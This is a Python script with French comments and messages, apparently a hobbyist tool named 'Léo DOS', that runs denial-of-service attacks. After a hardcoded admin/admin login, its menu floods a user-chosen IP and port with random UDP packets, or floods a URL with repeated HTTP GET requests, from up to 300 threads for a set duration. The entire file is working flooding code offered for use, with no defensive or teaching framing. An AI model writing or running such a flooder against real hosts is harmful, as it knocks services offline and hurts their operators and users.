import socket
import random
import time
import requests
import os
import getpass
from concurrent.futures import ThreadPoolExecutor

# -------------------------------
# Fonction pour nettoyer la console
def nettoyer_console():
    os.system('cls' if os.name == 'nt' else 'clear')

# -------------------------------
# Animation ASCII stylée
def animation_ascii():
    """Animation pour l'écran de démarrage."""
    frames = [
        "Initialisation...",
        "[█                   ] 10% - Chargement des modules réseau",
        "[███                ] 30% - Génération des paquets aléatoires",
        "[█████              ] 50% - Vérification des paramètres système",
        "[███████           ] 70% - Configuration des sockets UDP",
        "[█████████         ] 90% - Lancement du moteur d'attaque",
        "[███████████       ] 100% - Prêt à tester 🚀",
    ]
    for frame in frames:
        nettoyer_console()
        print(frame)
        time.sleep(0.5)
    nettoyer_console()
    print("🚀 Bienvenue sur Léo DOS !")

# -------------------------------
# Fonction de connexion avec interface stylée
def login():
    """Login avec vérification des identifiants."""
    nettoyer_console()
    print("\033[94m" + "═" * 50)
    print("🔐 Bienvenue sur Léo DOS".center(50))
    print("Veuillez vous connecter pour continuer".center(50))
    print("═" * 50 + "\033[0m")

    utilisateur = "admin"
    mot_de_passe = "admin"
    nom_utilisateur = input(" identifiant : ")
    mot_de_passe_saisi = getpass.getpass(prompt=' Mot de passe : ')
    
    if nom_utilisateur == utilisateur and mot_de_passe_saisi == mot_de_passe:
        print("\n✔ Connexion réussie !")
        time.sleep(1)
        animation_ascii()
    else:
        print("\n✘ Identifiants incorrects. Au revoir.")
        sys.exit()

# -------------------------------
# Analyse de la cible
def analyse_cible(cible):
    """Effectue une analyse de base de la cible (résolution IP et ports ouverts)."""
    print("\n🔍 Analyse de la cible...")
    try:
        ip = socket.gethostbyname(cible)
        print(f"✔ Adresse IP résolue : {ip}")
        return ip
    except socket.gaierror:
        print("✘ Impossible de résoudre la cible. Vérifiez l'adresse.")
        return None

# -------------------------------
# Détection automatique des threads
def detecter_threads(cible):
    """Détecte automatiquement le nombre optimal de threads pour la cible."""
    print("\n⚙ Analyse pour déterminer le nombre optimal de threads...")
    threads = 100  # Par défaut
    try:
        if cible.startswith("http://") or cible.startswith("https://"):
            response = requests.get(cible, timeout=5)
            taille_contenu = len(response.content)
            print(f"✔ Cible HTTP/HTTPS détectée. Taille de la réponse : {taille_contenu} octets.")
            if taille_contenu < 1000:
                threads = 300
            elif taille_contenu < 10000:
                threads = 200
            else:
                threads = 100
        else:
            print("✔ Cible IP détectée. Utilisation de threads optimaux.")
            threads = 250
    except Exception as e:
        print(f"✘ Erreur lors de l'analyse de la cible : {e}")
        threads = 150  # Par défaut en cas d'échec
    print(f"✔ Nombre de threads recommandé : {threads}")
    return threads

# -------------------------------
# Fonction d'attaque UDP
def attaque_udp(ip, port, duree):
    """Effectue une attaque DoS UDP."""
    threads = detecter_threads(ip)
    print(f"\n🚀 Attaque UDP sur {ip}:{port} avec {threads} threads pendant {duree} secondes...")
    timeout = time.time() + duree

    def envoyer_paquets():
        while time.time() < timeout:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                    paquet = random._urandom(1024)
                    s.sendto(paquet, (ip, port))
            except Exception:
                pass

    with ThreadPoolExecutor(max_workers=threads) as executor:
        for _ in range(threads):
            executor.submit(envoyer_paquets)

    print("\n✔ DOS par UDP terminé.")

# -------------------------------
# Fonction d'attaque HTTP/HTTPS
def attaque_http(url, duree):
    """Effectue une attaque HTTP/HTTPS."""
    threads = detecter_threads(url)
    print(f"\n🚀 Attaque HTTP/HTTPS sur {url} avec {threads} threads pendant {duree} secondes...")
    timeout = time.time() + duree

    def envoyer_requetes():
        while time.time() < timeout:
            try:
                response = requests.get(url, timeout=5)
                print(f"📦 Requête envoyée. Réponse : {response.status_code}")
            except Exception:
                pass

    with ThreadPoolExecutor(max_workers=threads) as executor:
        for _ in range(threads):
            executor.submit(envoyer_requetes)

    print("\n✔ Test HTTP/HTTPS terminé.")

# -------------------------------
# Menu principal avec interface stylée
def menu():
    while True:
        nettoyer_console()
        print("\033[92m" + "═" * 50)
        print("🔥 Léo Denied Of Services 🔥".center(50))
        print("Choisissez une option pour continuer".center(50))
        print("═" * 50)
        print("\033[93m1. Lancer un DOS par UDP")
        print("2. Lancer un DOS par HTTP/HTTPS")
        print("3. Quitter\033[0m")
        print("═" * 50)

        choix = input("\n➤ Choisissez une option : ")

        if choix == "1":
            cible = input("\n➤ Entrez l'adresse IP ou le site cible : ")
            ip = analyse_cible(cible)
            if not ip:
                continue
            port = int(input("➤ Entrez le port (par défaut : 80) : ") or 80)
            duree = int(input("➤ Entrez la durée de l'attaque (en secondes) : "))
            attaque_udp(ip, port, duree)

        elif choix == "2":
            cible = input("\n➤ Entrez l'URL cible (exemple : http://exemple.com) : ")
            duree = int(input("➤ Entrez la durée de l'attaque (en secondes) : "))
            attaque_http(cible, duree)

        elif choix == "3":
            print("\n👋 Au revoir !")
            break

        else:
            print("\n✘ Choix invalide. Veuillez réessayer.")

# -------------------------------
# Point d'entrée principal
if __name__ == "__main__":
    login()
    menu()
